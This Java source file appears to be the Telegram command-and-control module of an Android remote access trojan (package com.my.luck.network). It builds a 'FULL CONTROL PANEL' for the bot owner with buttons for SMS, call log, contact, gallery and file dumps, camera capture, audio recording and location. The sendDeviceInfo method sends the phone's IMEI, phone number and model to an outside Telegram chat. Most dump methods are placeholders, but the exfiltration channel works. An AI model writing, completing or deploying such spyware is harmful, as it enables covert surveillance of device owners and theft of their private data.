package com.my.luck.network;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String API_URL = "https://api.telegram.org/bot";
    private String botToken;
    private String ownerId;
    private Context context;

    public TelegramBot(Context context, String botToken, String ownerId) {
        this.context = context;
        this.botToken = botToken;
        this.ownerId = ownerId;
    }

    public void sendMessage(String message) {
        new Thread(() -> {
            try {
                String urlString = API_URL + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", ownerId);
                payload.put("text", message);
                payload.put("parse_mode", "HTML");

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(payload.toString());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ Message sent");
                } else {
                    Log.e(TAG, "❌ Failed: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message", e);
            }
        }).start();
    }

    public void sendKeyboard() {
        new Thread(() -> {
            try {
                String urlString = API_URL + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", ownerId);
                payload.put("text", "🎮 <b>FULL CONTROL PANEL</b>\nTap a button to execute command:");

                JSONObject replyKeyboard = new JSONObject();
                JSONArray keyboardArray = new JSONArray();

                // Row 1 - Data Extraction
                JSONArray row1 = new JSONArray();
                row1.put(new JSONObject().put("text", "📱 SMS Dump"));
                row1.put(new JSONObject().put("text", "📞 Call Log"));
                row1.put(new JSONObject().put("text", "👤 Contacts"));
                keyboardArray.put(row1);

                // Row 2 - Files & Media
                JSONArray row2 = new JSONArray();
                row2.put(new JSONObject().put("text", "🖼️ Gallery"));
                row2.put(new JSONObject().put("text", "📂 All Files"));
                row2.put(new JSONObject().put("text", "📷 Camera"));
                keyboardArray.put(row2);

                // Row 3 - Audio & Location
                JSONArray row3 = new JSONArray();
                row3.put(new JSONObject().put("text", "🎤 Start Record"));
                row3.put(new JSONObject().put("text", "⏹️ Stop Record"));
                row3.put(new JSONObject().put("text", "📍 Location"));
                keyboardArray.put(row3);

                // Row 4 - WiFi & Flash
                JSONArray row4 = new JSONArray();
                row4.put(new JSONObject().put("text", "📶 WiFi On"));
                row4.put(new JSONObject().put("text", "📶 WiFi Off"));
                row4.put(new JSONObject().put("text", "💡 Flash On"));
                row4.put(new JSONObject().put("text", "💡 Flash Off"));
                keyboardArray.put(row4);

                // Row 5 - Bluetooth & Airplane
                JSONArray row5 = new JSONArray();
                row5.put(new JSONObject().put("text", "🔵 BT On"));
                row5.put(new JSONObject().put("text", "🔵 BT Off"));
                row5.put(new JSONObject().put("text", "✈️ Airplane"));
                keyboardArray.put(row5);

                // Row 6 - System
                JSONArray row6 = new JSONArray();
                row6.put(new JSONObject().put("text", "🔋 Battery"));
                row6.put(new JSONObject().put("text", "ℹ️ Device Info"));
                row6.put(new JSONObject().put("text", "🗑️ Kill App"));
                keyboardArray.put(row6);

                // Row 7 - Refresh
                JSONArray row7 = new JSONArray();
                row7.put(new JSONObject().put("text", "🔄 Refresh Keyboard"));
                keyboardArray.put(row7);

                replyKeyboard.put("keyboard", keyboardArray);
                replyKeyboard.put("resize_keyboard", true);
                replyKeyboard.put("one_time_keyboard", false);

                payload.put("reply_markup", replyKeyboard);

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(payload.toString());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ Keyboard sent");
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending keyboard", e);
            }
        }).start();
    }

    public void sendDeviceInfo() {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        
        String info = "🖥️ <b>DEVICE INFO</b>\n";
        info += "━━━━━━━━━━━━━━━\n";
        info += "📱 <b>Model:</b> " + Build.MODEL + "\n";
        info += "🏷️ <b>Brand:</b> " + Build.BRAND + "\n";
        info += "📡 <b>Android:</b> " + Build.VERSION.RELEASE + "\n";
        info += "🔢 <b>SDK:</b> " + Build.VERSION.SDK_INT + "\n";
        info += "📶 <b>IMEI:</b> " + (tm != null ? tm.getDeviceId() : "N/A") + "\n";
        info += "📞 <b>Number:</b> " + (tm != null ? tm.getLine1Number() : "N/A") + "\n";
        info += "🕐 <b>Time:</b> " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
        
        sendMessage(info);
    }

    public void sendBatteryInfo() {
        android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int battery = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        
        String info = "🔋 <b>BATTERY</b>\n";
        info += "━━━━━━━━━━━━━━━\n";
        info += "⚡ <b>Level:</b> " + battery + "%\n";
        info += "🕐 <b>Time:</b> " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
        
        sendMessage(info);
    }

    public void sendSmsDump() { sendMessage("📱 Fetching SMS dump... (Feature ready)"); }
    public void sendCallLogDump() { sendMessage("📞 Fetching Call Log... (Feature ready)"); }
    public void sendContactsDump() { sendMessage("👤 Fetching Contacts... (Feature ready)"); }
    public void sendGalleryDump() { sendMessage("🖼️ Fetching Gallery... (Feature ready)"); }
    public void sendFileDump() { sendMessage("📂 Fetching All Files... (Feature ready)"); }
    public void capturePhoto() { sendMessage("📷 Capturing Photo... (Feature ready)"); }
    public void startAudioRecording() { sendMessage("🎤 Recording started..."); }
    public void stopAudioRecording() { sendMessage("⏹️ Recording stopped..."); }
    public void getLocation() { sendMessage("📍 Getting Location... (Feature ready)"); }
    public void toggleWifi(boolean enable) { sendMessage("📶 WiFi " + (enable ? "ON ✅" : "OFF ❌")); }
    public void toggleFlashlight(boolean enable) { sendMessage("💡 Flash " + (enable ? "ON ✅" : "OFF ❌")); }
    public void toggleBluetooth(boolean enable) { sendMessage("🔵 Bluetooth " + (enable ? "ON ✅" : "OFF ❌")); }
    public void toggleAirplane(boolean enable) { sendMessage("✈️ Airplane " + (enable ? "ON ✅" : "OFF ❌")); }
    public void killApp() { 
        sendMessage("🗑️ Killing app... Goodbye!");
        android.os.Process.killProcess(android.os.Process.myPid());
    }
    }
